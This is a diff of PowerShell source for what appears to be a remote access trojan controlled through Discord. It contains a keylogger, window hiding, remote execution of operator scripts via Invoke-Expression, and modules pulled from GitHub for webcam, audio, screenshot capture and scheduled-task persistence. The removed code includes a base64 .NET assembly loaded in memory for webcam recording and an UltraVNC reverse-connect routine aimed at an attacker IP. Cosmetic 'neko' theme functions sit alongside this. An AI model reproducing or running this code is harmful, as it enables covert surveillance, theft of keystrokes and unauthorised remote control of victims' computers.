@@ -1,10 +1,101 @@
-# =============================== GLOBAL VARIABLES ===============================
+#v1
+
+# =============================== GLOBAL VARIABLES - IMPT ===============================
 $global:token = $token
 $script:Jobs = @{}
 $global:hidewindow = $true
 $global:keyloggerstatus = $false
 $global:lastMessageAttachments = $null
+# =============================== GLOBAL VAR - THEME ==============================
+# You can add more here but gotta install the files yourself ( URL not supported for now )
+# shld add download and stuff
+# 
+$global:themes = @{
+    darktheme = @{
+        color = "black"
+        image = $null
+    }
+    neko_maid = @{
+        color = "#ffdb54"
+        image = "./nekos/neko_maid.jpg"
+    }
+    neko_kimono = @{
+        color = "#ffdb54"
+        image = "./nekos/neko_kimono.jpg"
+    }
+    neko_cafe = @{
+        color = "#ffdb54"
+        image = "./nekos/neko_cafe.jpg"
+    }
 
+}
+$global:currenttheme = "neko_maid"
+$global:theme_enabled = $false
+
+# =============================== THEME FUNCTIONS ======================
+#GETTHEME
+function GetCurrentTheme{
+    if ($global:theme_enabled){
+        sendEmbedWithImage -Title "Current theme: $($global:currenttheme)" -Description "Color: $($global:themes[$global:currenttheme].color)`nImage Path: $($global:themes[$global:currenttheme].image)"
+    }
+    else{
+        sendEmbedWithImage -Title "Themes are currently disabled" -Description "Use the command `ENABLETHEME` to enable themes"
+    }
+}
+#SETTHEME
+function SetCurrentTheme{
+    param([string]$themename)
+    if ($global:themes.ContainsKey($themename)){
+        $global:currenttheme = $themename
+        sendEmbedWithImage -Title "Theme changed to: $($global:currenttheme)" -Description "Color: $($global:themes[$global:currenttheme].color)`nImage Path: $($global:themes[$global:currenttheme].image)"
+    }
+    else{
+        $availableThemes = $global:themes.Keys -join ", "
+        sendEmbedWithImage -Title ":x: **Theme not found**" -Description "Available themes are: $availableThemes"
+    }
+}
+#ENABLETHEME
+function EnableTheme{
+    $global:theme_enabled = $true
+    sendEmbedWithImage -Title "Themes have been enabled" -Description "Use the command `SETTHEME` to change the theme."
+}
+#DISABLETHEME
+function DisableTheme{
+    $global:theme_enabled = $false
+    sendEmbedWithImage -Title "Themes have been disabled" -Description "Use the command `ENABLETHEME` to enable themes."
+}
+# =============================== NEEDED ====================================
+
+#ENABLEFFMPEG
+function GetFfmpeg{
+    sendEmbedWithImage -Title "Downloading FFmpeg" -Description "Please wait while FFmpeg is being downloaded..."  
+    $Path = "$env:Temp\ffmpeg.exe"
+    $tempDir = "$env:temp"
+    If (!(Test-Path $Path)){  
+        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
+        $wc = New-Object System.Net.WebClient           
+        $wc.Headers.Add("User-Agent", "PowerShell")
+        $response = $wc.DownloadString("$apiUrl")
+        $release = $response | ConvertFrom-Json
+        $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
+        $zipUrl = $asset.browser_download_url
+        $zipFilePath = Join-Path $tempDir $asset.name
+        $extractedDir = Join-Path $tempDir ($asset.name -replace '.zip$', '')
+        $wc.DownloadFile($zipUrl, $zipFilePath)
+        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
+        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
+        rm -Path $zipFilePath -Force
+        rm -Path $extractedDir -Recurse -Force
+    }
+}
+
+#DISABLEFFMPEG
+function RemoveFfmpeg{
+    $Path = "$env:Temp\ffmpeg.exe"
+    If (Test-Path $Path){  
+        rm -Path $Path -Force
+    }
+}
 # =============================== DISCORD API FUNCTIONS ===============================
 function Invoke-DiscordAPI {
     param(
@@ -105,22 +196,161 @@ Function PullMsg {
 
 # =============================== MESSAGE FUNCTIONS ===============================
 function sendMsg {
-    param([string]$Message, [string]$Embed)
+    param([string]$Message, [hashtable]$Embed, [string]$ImagePath)
     $url = "https://discord.com/api/v10/channels/$SessionID/messages"
+    
+    if ($ImagePath -and (Test-Path $ImagePath)) {
+        sendMsgWithImage -Message $Message -Embed $Embed -ImagePath $ImagePath
+        return
+    }
     
     if ($Embed) {
         $wc = New-Object System.Net.WebClient
         $wc.Headers.Add("Authorization", "Bot $token")
         $wc.Headers.Add("Content-Type", "application/json; charset=utf-8")
-        $jsonBody = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
+        $jsonBody = $Embed | ConvertTo-Json -Depth 10 -Compress
         try { $response = $wc.UploadString($url, "POST", $jsonBody) } catch {}
-        $jsonPayload = $null
     }
     
     if ($Message) {
         if ($Message.Length -gt 15000) { Send_AsFile -Content $Message }
         elseif ($Message.Length -gt 1950) { Send_ChunkedMessage -Content $Message }
         else { Send_SingleMessage -Content $Message }
+    }
+}
+
+function sendMsgWithImage {
+    param([string]$Message, [hashtable]$Embed, [string]$ImagePath)
+    
+    if (-not (Test-Path $ImagePath)) {
+        sendMsg -Message ":x: **Image file not found:** ``$ImagePath``"
+        return
+    }
+    
+    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
+    
+    try {
+        # Create multipart form data
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $LF = "`r`n"
+        
+        # Prepare the payload
+        $payload = @{}
+        
+        if ($Message) {
+            $payload.content = $Message
+        }
+        
+        if ($Embed) {
+            $payload.embeds = @($Embed)
+        }
+        
+        $jsonPayload = $payload | ConvertTo-Json -Depth 10 -Compress
+        
+        # Read image file
+        $imageBytes = [System.IO.File]::ReadAllBytes($ImagePath)
+        $fileName = [System.IO.Path]::GetFileName($ImagePath)
+        
+        # Build multipart form data properly
+        $bodyLines = @()
+        $bodyLines += "--$boundary"
+        $bodyLines += "Content-Disposition: form-data; name=`"payload_json`""
+        $bodyLines += "Content-Type: application/json"
+        $bodyLines += ""
+        $bodyLines += $jsonPayload
+        $bodyLines += "--$boundary"
+        $bodyLines += "Content-Disposition: form-data; name=`"files[0]`"; filename=`"$fileName`""
+        $bodyLines += "Content-Type: application/octet-stream"
+        $bodyLines += ""
+        
+        # Convert text to bytes
+        $bodyText = ($bodyLines -join $LF) + $LF
+        $bodyTextBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyText)
+        
+        # End boundary
+        $endBoundary = $LF + "--$boundary--" + $LF
+        $endBoundaryBytes = [System.Text.Encoding]::UTF8.GetBytes($endBoundary)
+        
+        # Combine all bytes
+        $totalBytes = New-Object byte[] ($bodyTextBytes.Length + $imageBytes.Length + $endBoundaryBytes.Length)
+        [Array]::Copy($bodyTextBytes, 0, $totalBytes, 0, $bodyTextBytes.Length)
+        [Array]::Copy($imageBytes, 0, $totalBytes, $bodyTextBytes.Length, $imageBytes.Length)
+        [Array]::Copy($endBoundaryBytes, 0, $totalBytes, $bodyTextBytes.Length + $imageBytes.Length, $endBoundaryBytes.Length)
+        
+        # Send request
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Headers.Add("Authorization", "Bot $token")
+        $webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
+        $webClient.Headers.Add("User-Agent", "CoralAgent/1.0")
+        
+        $response = $webClient.UploadData($url, "POST", $totalBytes)
+        $webClient.Dispose()
+        
+    } catch {
+        # Fall back to regular file upload if embed with image fails
+        try {
+            if ($Message -or ($Embed -and $Embed.title)) {
+                $fallbackMsg = if ($Message) { $Message } else { $Embed.title }
+                sendMsg -Message $fallbackMsg
+            }
+            sendFile -sendfilePath $ImagePath
+        } catch {
+            sendMsg -Message ":x: **Error sending image:** $($_.Exception.Message)"
+        }
+    }
+}
+
+function sendEmbedWithImage {
+    param([string]$Title, [string]$Description, [string]$ImagePath = $null, [int]$Color = $null)
+    
+    # Get theme color - always use theme color unless explicitly overridden
+    $Color = $global:themes[$global:currenttheme].color
+    
+    
+    # Determine image path logic
+    $finalImagePath = $null
+    
+    if ([string]::IsNullOrEmpty($ImagePath)) {
+        # No image path provided - use theme image if themes are enabled
+        if ($global:theme_enabled -eq $true) {
+            $themeImagePath = $global:themes[$global:currenttheme].image
+            if ($themeImagePath -and (Test-Path $themeImagePath)) {
+                $finalImagePath = $themeImagePath
+            }
+        }
+        # If themes disabled or no theme image, $finalImagePath stays null
+    } else {
+        # Image path provided - use it if it exists
+        if (Test-Path $ImagePath) {
+            $finalImagePath = $ImagePath
+        }
+        # If provided path doesn't exist, $finalImagePath stays null
+    }
+    
+    # Send embed with or without image based on final determination
+    if ($finalImagePath) {
+        # Send embed with image
+        $embed = @{
+            title = $Title
+            description = $Description
+            color = $Color
+            image = @{
+                url = "attachment://$(Split-Path $finalImagePath -Leaf)"
+            }
+        }
+        sendMsgWithImage -Embed $embed -ImagePath $finalImagePath
+    } else {
+        # Send embed without image
+        $embed = @{
+            embeds = @(
+                @{
+                    title = $Title
+                    description = $Description
+                    color = $Color
+                }
+            )
+        }
+        sendMsg -Embed $embed
     }
 }
 
@@ -233,7 +463,9 @@ function Clean_MessageContent {
     return $cleaned
 }
 
-# =============================== FILE FUNCTIONS ===============================
+# =============================== FILE FUNCTIONS (R)===============================
+
+#SENDFILE
 function sendFile {
     param([string]$sendfilePath)
     if (-not $sendfilePath -or -not (Test-Path $sendfilePath -PathType Leaf)) {
@@ -260,7 +492,7 @@ function sendFile {
         sendMsg -Message ":x: **File not found:** ``$sendfilePath``"
     }
 }
-
+#DOWNLOADFILE
 function downloadFile {
     param([string]$attachmentUrl, [string]$fileName, [string]$downloadPath = $env:TEMP)
     
@@ -297,7 +529,8 @@ function downloadFile {
         sendMsg -Message ":x: **Download error:** $($_.Exception.Message)"
     }
 }
-
+# =============================== quick info ===================
+#QUICKINFO
 # =============================== WINDOW FUNCTIONS ===============================
 function HideWindow {
     $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
@@ -314,7 +547,8 @@ function HideWindow {
     }
 }
 
-# =============================== KEYLOGGER FUNCTIONS ===============================
+# =============================== KEYLOGGER FUNCTIONS (R)===============================
+
 function keylogger {
     param (
         [int]$intervalSeconds = 30
@@ -457,7 +691,7 @@ function keylogger {
         sendMsg -Message ":stop_sign: **Keylogger stopped on $deviceId**"
     }
 }
-
+#ENABLEKEYLOG
 function Start_Keylogger {
     param([int]$intervalSeconds = 30)
     
@@ -502,7 +736,7 @@ function Start_Keylogger {
         sendMsg -Message ":x: **Failed to start keylogger:** $($_.Exception.Message)"
     }
 }
-
+#DISABLEKEYLOG
 function Stop_Keylogger {
     $global:keyloggerstatus = $false
     
@@ -537,7 +771,7 @@ function Stop_Keylogger {
         sendMsg -Message ":information_source: **Keylogger is not running**"
     }
 }
-
+#GETKEYLOGSTATUS
 function Get_KeyloggerStatus {
     if ($global:keyloggerstatus -and $script:Jobs.ContainsKey("KEYLOGGER")) {
         $job = $script:Jobs["KEYLOGGER"]
@@ -546,141 +780,95 @@ function Get_KeyloggerStatus {
         sendMsg -Message ":gear: **Keylogger Status:** Stopped"
     }
 }
-
-
-# =============================== SS FUNCTIONS ===============================
-function screenshot_all {
-    try {
-        Add-Type -AssemblyName System.Windows.Forms
-        Add-Type -AssemblyName System.Drawing
-        
-        $screens = [System.Windows.Forms.Screen]::AllScreens
-        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
-        
-        if ($screens.Count -gt 1) {
-            sendMsg -Message ":camera: **Capturing $($screens.Count) monitors...**"
-            
-            for ($i = 0; $i -lt $screens.Count; $i++) {
-                $screen = $screens[$i]
-                $tempFile = "$env:temp\screenshot_monitor$($i+1)_$timestamp.png"
-                
-                if ($screen.Primary) {
-                    $width = Get-CimInstance Win32_VideoController | Select-Object -First 1
-                    $width = [int]($width.CurrentHorizontalResolution)
-                    $height = Get-CimInstance Win32_VideoController | Select-Object -First 1
-                    $height = [int]($height.CurrentVerticalResolution)
-                    $bitmap = New-Object System.Drawing.Bitmap $width, $height
-                    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-                    $graphic.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
-                } else {
-                    $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
-                    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-                    $graphic.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $screen.Bounds.Size)
-                }
-                $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)
-                $graphic.Dispose()
-                $bitmap.Dispose()
-                
-                if (Test-Path $tempFile) {
-                    sendFile -sendfilePath $tempFile
-                    Start-Sleep -Seconds 1
-                    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
-                }
-            }
-        } else {
-            $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
-            $tempFile = "$env:temp\screenshot_$timestamp.png"
-            
-            $width = Get-CimInstance Win32_VideoController | Select-Object -First 1
-            $width = [int]($width.CurrentHorizontalResolution)
-            $height = Get-CimInstance Win32_VideoController | Select-Object -First 1
-            $height = [int]($height.CurrentVerticalResolution)
-            
-            $bitmap = New-Object System.Drawing.Bitmap $width, $height
-            $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-            $graphic.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
-
-            $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)
-            $graphic.Dispose()
-            $bitmap.Dispose()
-            sendFile -sendfilePath $tempFile
-            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
-        }
-    } catch {
-        sendMsg -Message ":x: **Multi-monitor screenshot error:** $($_.Exception.Message)"
-    }
-}
-
-# =============================== WEBCAM FUNCTIONS ===============================
-function Webcam {
-    param(
-        [int]$durationSeconds = 1,
-        [string]$quality = "low"
-    )
-    
-    $encMergedAssembly = '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'
-
-    $tempDir = $env:TEMP
-    $fileName = "coral_webcam_$(Get-Date -Format 'yyyyMMdd_HHmmss').avi"
-    $OutPath = Join-Path $tempDir $fileName  
-    $RecordTime = $durationSeconds
-    
-    $bytes = [Convert]::FromBase64String($encMergedAssembly)
-    try {
-        [System.Reflection.Assembly]::Load($bytes) | Out-Null
-    } catch {
-        sendMsg -Message ":x: **Error loading webcam assembly:** $($_.Exception.Message)"
-        return
-    }
-    
-    try {
-        $filters = New-Object DirectX.Capture.Filters 
-    } catch {
-        sendMsg -Message ":x: **Error creating webcam filters:** $($_.Exception.Message)"
-        return
-    }
-    
-    if (($null -ne $filters.VideoInputDevices) -and ($filters.AudioInputDevices)) {
-        $VideoInput = $filters.VideoInputDevices[0]
-        $AudioInput = $filters.AudioInputDevices[0]
-        $VideoCapture = New-Object DirectX.Capture.Capture -ArgumentList $VideoInput,$AudioInput
-        $VideoCapture.Filename = $OutPath
-        $Compression = $filters.VideoCompressors[0]
-        if ($null -ne $Compression) {
-            $VideoCapture.VideoCompressor = $Compression
-        }
-        
-        try{
-            $VideoCapture.Start()
-            sendMsg -Message ":video_camera: **Starting webcam recording** (Duration: ${RecordTime}s)"
-        } catch {
-            sendMsg -Message ":x: **Unable to start webcam capture**"
-            $VideoCapture.Stop()
-            return
-        }
-        Start-Sleep -seconds $RecordTime
-        $VideoCapture.stop()
-        
-        if (Test-Path $OutPath) {
-            sendMsg -Message ":video_camera: **Webcam recording completed** (Duration: ${RecordTime}s)"
-            sendFile -sendfilePath $OutPath
-            Start-Sleep -Seconds 2
-            Remove-Item $OutPath -Force -ErrorAction SilentlyContinue
-        } else {
-            sendMsg -Message ":x: **Failed to create webcam recording file**"
-        }
-    } else {
-        sendMsg -Message ":x: **No webcam or audio devices found**"    
-    }
-}
-
+# =============================== SS FUNCTIONS (R) ===============================
+#SCREENSHOT
+# =============================== WEBCAM FUNCTIONS (R) ===============================
+#WEBCAM
+# =============================== AUDIO (R) ========================================
+#AUDIO
 # =============================== JOB MANAGEMENT FUNCTIONS ===============================
+
+#FIX AGENTS
 function Start_AgentJob {
     param($ScriptString)
     $RandName = -join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 6)
-    $job = Start-Job -ScriptBlock ([ScriptBlock]::Create($ScriptString))
+    
+    $job = Start-Job -ScriptBlock {
+        param($ScriptString, $token, $SessionID, $CategoryID)
+        
+        # Set global variables in job scope
+        $global:token = $token
+        $global:SessionID = $SessionID
+        $global:CategoryID = $CategoryID
+        
+        # Import all necessary functions into job scope
+        ${function:Invoke-DiscordAPI} = ${using:function:Invoke-DiscordAPI}
+        ${function:sendMsg} = ${using:function:sendMsg}
+        ${function:Send_SingleMessage} = ${using:function:Send_SingleMessage}
+        ${function:Send_ChunkedMessage} = ${using:function:Send_ChunkedMessage}
+        ${function:Send_AsFile} = ${using:function:Send_AsFile}
+        ${function:Split_IntoChunks} = ${using:function:Split_IntoChunks}
+        ${function:Clean_MessageContent} = ${using:function:Clean_MessageContent}
+        ${function:sendFile} = ${using:function:sendFile}
+        ${function:sendMsgWithImage} = ${using:function:sendMsgWithImage}
+        ${function:sendEmbedWithImage} = ${using:function:sendEmbedWithImage}
+        
+        # Import FFmpeg functions
+        ${function:GetFfmpeg} = ${using:function:GetFfmpeg}
+        ${function:RemoveFfmpeg} = ${using:function:RemoveFfmpeg}
+        
+        # Import webcam functions
+        ${function:Awebcam} = ${using:function:Awebcam}
+        
+        # Import screenshot functions
+        ${function:Ascreenshot} = ${using:function:Ascreenshot}
+        
+        # Import audio functions
+        ${function:Aaudio} = ${using:function:Aaudio}
+        
+        # Import theme functions
+        ${function:GetCurrentTheme} = ${using:function:GetCurrentTheme}
+        ${function:SetCurrentTheme} = ${using:function:SetCurrentTheme}
+        ${function:EnableTheme} = ${using:function:EnableTheme}
+        ${function:DisableTheme} = ${using:function:DisableTheme}
+        
+        # Import other utility functions
+        ${function:AquickInfo} = ${using:function:AquickInfo}
+        ${function:AGetneko} = ${using:function:AGetneko}
+        ${function:ARemoveNeko} = ${using:function:ARemoveNeko}
+        ${function:StartUvnc} = ${using:function:StartUvnc}
+        ${function:RemoveUVNC} = ${using:function:RemoveUVNC}
+        ${function:downloadFile} = ${using:function:downloadFile}
+        
+        # Import keylogger functions
+        ${function:keylogger} = ${using:function:keylogger}
+        ${function:Start_Keylogger} = ${using:function:Start_Keylogger}
+        ${function:Stop_Keylogger} = ${using:function:Stop_Keylogger}
+        ${function:Get_KeyloggerStatus} = ${using:function:Get_KeyloggerStatus}
+        
+        # Import persistence functions
+        ${function:create_Ptask} = ${using:function:create_Ptask}
+        ${function:remove_Ptask} = ${using:function:remove_Ptask}
+        
+        # Import global variables that functions might need
+        $global:themes = ${using:global:themes}
+        $global:currenttheme = ${using:global:currenttheme}
+        $global:theme_enabled = ${using:global:theme_enabled}
+        $global:hidewindow = ${using:global:hidewindow}
+        $global:keyloggerstatus = ${using:global:keyloggerstatus}
+        $global:lastMessageAttachments = ${using:global:lastMessageAttachments}
+        
+        # Execute the provided script
+        try {
+            Invoke-Expression $ScriptString
+        } catch {
+            Write-Error "Job execution error: $($_.Exception.Message)"
+        }
+        
+    } -ArgumentList $ScriptString, $global:token, $global:SessionID, $global:CategoryID
+    
     $script:Jobs[$RandName] = $job
-    sendMsg -Message "Job Started: ``$RandName`` | ID: $($job.Id)"
+    sendMsg -Message ":gear: **Job Started:** ``$RandName`` | ID: $($job.Id)`n:information_source: **Available functions:** Awebcam, Ascreenshot, Aaudio, AquickInfo, GetCurrentTheme, etc."
     return $RandName
 }
 
@@ -842,39 +1030,14 @@ function Check_CompletedJobs {
     }
 }
 
-# =============================== UVNC FUNCTIONS ===============================
-Function StartUvnc {
-    param([string]$ip,[string]$port)
-    sendMsg -Message "Set up UVNC Lister, IP: $ip, Port: $port"
-    sendMsg -Message ":arrows_counterclockwise: ``Starting UVNC Client..`` :arrows_counterclockwise:"
-    $tempFolder = "$env:temp\vnc"
-    $vncDownload = "https://github.com/JoshuaBrien/Compilation-of-stuff-i-done/raw/refs/heads/main/Coral_network_discordONLY/assets/UltraVNC.zip"
-    $vncZip = "$tempFolder\UltraVNC.zip" 
-    if (!(Test-Path -Path $tempFolder)) {
-        New-Item -ItemType Directory -Path $tempFolder | Out-Null
-    }  
-    if (!(Test-Path -Path $vncZip)) {
-        Iwr -Uri $vncDownload -OutFile $vncZip
-    }
-    Start-Sleep 1
-    Expand-Archive -Path $vncZip -DestinationPath $tempFolder -Force
-    Start-Sleep 1 
-    rm -Path $vncZip -Force  
-    $proc = "$tempFolder\winvnc.exe"
-    Start-Process $proc -ArgumentList ("-run")
-    Start-Sleep 2
-    Start-Process $proc -ArgumentList ("-connect $ip::$port")
-}
+# =============================== UVNC FUNCTIONS (R)===============================
+#ENABLEUVNC
+#DISABLEUVNC
+# =============================== DISCORD (R) =============== 
+#ENABLENEKO
+#REMOVENEKO
+# =============================== SCRIPT MANAGEMENT ===============================
 
-Function RemoveUVNC {
-    sendMsg -Message ":wastebasket: ``Removing UVNC files...`` :wastebasket:"
-    $tempFolder = "$env:temp\vnc"
-    if (Test-Path -Path $tempFolder) {
-        rm -Path $tempFolder -Force 
-    }
-}
-
-# =============================== PROCESS MANAGEMENT ===============================
 function Check_ScriptAlreadyRunning {
     param([bool]$UseDiscord = $false)
     
@@ -924,17 +1087,559 @@ function Cleanup_CoralAgent {
     } catch {}
 }
 
+
 trap { try { Cleanup_CoralAgent } catch {}; continue }
 
-# =============================== HELP MENU ===============================
+
+# =============================== PERSISTENCE ( R )=============================
+#ENABLEPTASK
+#DISABLEPTASK
+
+# =============================== MODULES (WIP) ===============================
+$global:ModuleRegistry = @{
+    # Core modules (always available)
+    core = @{
+        name = "Core Functions"
+        functions = @("sendMsg", "sendFile", "GetCurrentTheme", "SetCurrentTheme")
+        loaded = $true
+        required = $true
+    }
+    
+    # Remote modules
+    recon = @{
+        name = "Reconnaissance Module"
+        baseUrl = "https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/modules/recon/"
+        scripts = @{
+            SCREENSHOT = @{
+                url = "Mscreenshot_all.ps1"
+                function = "Mscreenshot"
+                alias = "SCREENSHOT"
+                description = "Take screenshots of all monitors"
+                params = @("monitor")
+            }
+            WEBCAM = @{
+                url = "Mwebcam.ps1"
+                function = "Mwebcam"
+                alias = "WEBCAM"
+                description = "Record webcam video"
+                params = @("duration", "quality")
+            }
+            AUDIO = @{
+                url = "Maudio.ps1"
+                function = "Maudio"
+                alias = "AUDIO"
+                description = "Record audio"
+                params = @("duration")
+            }
+            QUICKINFO = @{
+                url = "MquickInfo.ps1"
+                function = "MquickInfo"
+                alias = "QUICKINFO"
+                description = "Get system information"
+                params = @()
+            }
+        }
+        loaded = $false
+        required = $false
+    }
+    
+    persistence = @{
+        name = "Persistence Module"
+        baseUrl = "https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/modules/persistence/"
+        scripts = @{
+            ENABLEPTASK = @{
+                url = "Mregptask.ps1"
+                function = "Mcreate_Ptask"
+                alias = "ENABLEPTASK"
+                description = "Create persistence task"
+                params = @("token")
+            }
+            DISABLEPTASK = @{
+                url = "Mregptask.ps1"
+                function = "Mremove_Ptask"
+                alias = "DISABLEPTASK"
+                description = "Remove persistence task"
+                params = @()
+            }
+        }
+        loaded = $false
+        required = $false
+    }
+    
+    KEYLOGGER = @{
+        name = "Keylogger Module"
+        functions = @("Start_Keylogger", "Stop_Keylogger", "Get_KeyloggerStatus")
+        loaded = $true
+        required = $false
+    }
+    
+    NEKOUVNC = @{
+        name = "UVNC Remote Access"
+        functions = @("StartUvnc", "RemoveUVNC")
+        loaded = $true
+        required = $false
+    }
+
+    NEKOS = @{
+        name = "Neko Module"
